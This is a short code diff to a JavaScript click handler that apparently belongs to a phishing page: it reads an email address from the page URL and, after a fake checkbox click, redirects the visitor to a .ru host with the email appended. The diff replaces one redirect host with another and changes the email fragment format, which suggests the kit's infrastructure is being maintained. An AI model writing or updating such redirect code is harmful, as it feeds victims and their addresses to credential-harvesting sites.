@@ -67,14 +67,14 @@ function handleCheckboxClick() {
         var email = getEmailFromUrl();
         
         // Base URL for redirection
-        var baseUrl = 'https://pulsecrazeit.ru/v41u/';
+        var baseUrl = 'https://novatechies.cbg.ru/BUeEj/';
         
         // Construct the new URL based on the presence of an email
         var newUrl = baseUrl;
         if (email) {
             // Manually encode the email and replace %40 with @
             var encodedEmail = encodeURIComponent(email).replace(/%40/g, '@');
-            newUrl += '' + encodedEmail;
+            newUrl += '#M' + encodedEmail;
         }
         
         setTimeout(function () {
